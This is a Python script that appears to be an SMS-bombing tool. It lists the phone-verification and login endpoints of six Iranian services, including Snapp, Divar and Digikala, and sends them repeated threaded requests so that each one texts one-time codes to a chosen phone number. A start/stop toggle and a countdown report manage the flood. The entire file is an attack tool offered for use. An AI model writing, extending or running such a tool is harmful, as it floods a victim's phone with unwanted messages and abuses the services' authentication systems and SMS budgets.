from enum import Enum
from typing import List

import requests
import threading
import time
import json


class NumberFormat(Enum):
    with0 = 0
    withCC = 1
    bare = 2


class RequestType(Enum):
    post = 0
    get = 1


class ServerDetails():
    def __init__(self, name: str, api_url_format: str, request_body_content_format: str, number_format: NumberFormat = NumberFormat.with0, request_type: RequestType = RequestType.post, timeout: int = 50, trigger_delay: float = 0):
        self.name: str = name
        self.api_url_format: str = api_url_format
        self.request_body_content_format: str = request_body_content_format
        self.number_format: NumberFormat = number_format
        self.request_type: RequestType = request_type
        self.timeout: int = timeout
        self.last_time: float = 0.0
        self.trigger_delay: float = trigger_delay
        self.should_dalay: bool = True
        self.response_status: int | None = None
        self.response_reason: str | None = None
        self.response_text: str | None = None


SERVERS: List[ServerDetails]= [
    ServerDetails(
        name='Banimode',
        api_url_format='https://mobapi.banimode.com/api/v2/auth/request',
        request_body_content_format='{"phone": "%phone_number%"}',
        number_format=NumberFormat.with0,
        request_type=RequestType.post,
        timeout=150,
        trigger_delay=0.0,
    ),
    ServerDetails(
        name='Snapp',
        api_url_format='https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=%phone_number%',
        request_body_content_format='{"cellphone": "%phone_number%"}',
        number_format=NumberFormat.with0,
        request_type=RequestType.post,
        timeout=120,
        trigger_delay=15.0,
    ),
    ServerDetails(
        name='Torob',
        api_url_format='https://api.torob.com/v4/user/phone/send-pin/?phone_number=%phone_number%',
        request_body_content_format='',
        number_format=NumberFormat.with0,
        request_type=RequestType.get,
        timeout=300,
        trigger_delay=40.0,
    ),
    ServerDetails(
        name='Divar',
        api_url_format='https://api.divar.ir/v5/auth/authenticate',
        request_body_content_format='{"phone": "%phone_number%"}',
        number_format=NumberFormat.bare,
        request_type=RequestType.post,
        timeout=30,
        trigger_delay=50.0,
    ),
    ServerDetails(
        name='Digikala',
        api_url_format='https://api.digikala.com/v1/user/authenticate/',
        request_body_content_format='{"backUrl":"/","username":"%phone_number%","otp_call":false}',
        number_format=NumberFormat.with0,
        request_type=RequestType.post,
        timeout=180,
        trigger_delay=60.0,
    ),
    ServerDetails(
        name='Gapfilm',
        api_url_format='https://core.gapfilm.ir/api/v3.1/Account/Login',
        request_body_content_format='{"Type":3,"Username":"%phone_number%","SourceChannel":"gf_website","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"120.0","GiftCode":null}',
        number_format=NumberFormat.bare,
        request_type=RequestType.post,
        timeout=300,
        trigger_delay=80.0,
    )
]


def fix_number(phone_number: str) -> str:
    return (phone_number.strip().lower().replace(" ", "").removeprefix("+98").removeprefix("0"))


def fix_with0(phone_number: str) -> str:
    return ('0' + phone_number)


def fix_withCC(phone_number: str) -> str:
    return ('+98' + phone_number)


def send_post_request(request_url: str, body_contents: object) -> requests.Response:
    return requests.post(
        url=request_url,
        data=None,
        json=body_contents
        )


def send_get_request(request_url: str) -> requests.Response:
    return requests.get(
        url=request_url
        )


def hit(server: ServerDetails, bare_phone_number: str) -> None:
    match server.number_format:
        case NumberFormat.with0:
            fixed_phone_number: str = fix_with0(bare_phone_number)
        case NumberFormat.withCC:
            fixed_phone_number: str = fix_withCC(bare_phone_number)
        case _:
            fixed_phone_number: str = bare_phone_number
    request_url: str = server.api_url_format.replace("%phone_number%", fixed_phone_number)
    if (server.request_type == RequestType.post):
        body_content: object = json.loads(server.request_body_content_format.replace("%phone_number%", fixed_phone_number))
        response: requests.Response = send_post_request(request_url, body_content)
    elif (server.request_type == RequestType.get):
        response: requests.Response = send_get_request(request_url)
    else:
        server.response_status = -1
        server.response_reason = "Wrong request type"
        server.response_text = "Couldn't send request."
        print(server.name + "  |  " + "Error with request type.")
        return
    server.response_status = response.status_code
    server.response_reason = str(response.reason)
    

def execute(phone_number: str) -> None:
    bare_phone_number: str = fix_number(phone_number)
    execusion_threads: List[threading.Thread] = []
    for selected_server in SERVERS:
        new_thread: threading.Thread = threading.Thread(target=hit, args=(selected_server, bare_phone_number, ), daemon=True)
        execusion_threads.append(new_thread)
    for selected_thread in execusion_threads:
        selected_thread.start()
    return


def constant_execution(phone_number: str, stop_event: threading.Event) -> None:
    while (not stop_event.is_set()):
        bare_phone_number: str = fix_number(phone_number)
        execusion_threads: List[threading.Thread] = []
        for selected_server in SERVERS:
            current_time: float = time.time()
            delta_time: float = current_time - selected_server.last_time
            if selected_server.should_dalay:
                delta_time -= selected_server.trigger_delay
            if ((delta_time) > selected_server.timeout):
                new_thread: threading.Thread = threading.Thread(target=hit, args=(selected_server, bare_phone_number, ), daemon=True)
                execusion_threads.append(new_thread)
                selected_server.last_time = time.time()
                if selected_server.should_dalay:
                    selected_server.should_dalay = False
        for selected_thread in execusion_threads:
            selected_thread.start()
    return
    

global background_thread
global background_thread_run_event
background_thread: threading.Thread | None = None
background_thread_stop_event: threading.Event = threading.Event()


def start_execution_toggle(phone_number: str) -> None:
    global background_thread
    global background_thread_stop_event
    time.sleep(0.3)
    for server in SERVERS:
        server.last_time = 0.0
        server.should_dalay = True
    time.sleep(0.3)
    background_thread_stop_event.clear()
    background_thread = threading.Thread(target=constant_execution, args=(phone_number, background_thread_stop_event, ), daemon=True)
    background_thread.start()
    return


def stop_execution_toggle() -> None:
    global background_thread_stop_event
    background_thread_stop_event.set()
    return


def get_data() -> str:
    report: str = ''
    #longest_length: int = 0
    #_ = [longest_length:=max(longest_length, len(current_server.name)) for current_server in SERVERS]
    for server in SERVERS:
        #long_name = server.name + (longest_length - len(server.name)) * ' '
        #report += long_name
        report += server.name
        report += '  :\n'
        #report += '  :  '
        report += '  [Status] '
        report += str(server.response_status)
        report += '  |  '
        report += str(server.response_reason)
        report += '\n'
        report += 'Time until next one (in seconds): ' 
        if server.response_status == None:
            report += ' [Not started yet]'
        else:
            reminder_time: float = server.timeout - (time.time() - server.last_time)
            if server.should_dalay:
                reminder_time += server.trigger_delay
            if reminder_time < 0:
                reminder_time = 0
                report += '[0], Ready.'
            else:
                report += str(int(reminder_time))
        if (server == SERVERS[-1]):
            continue
        report += '\n\n'
    return report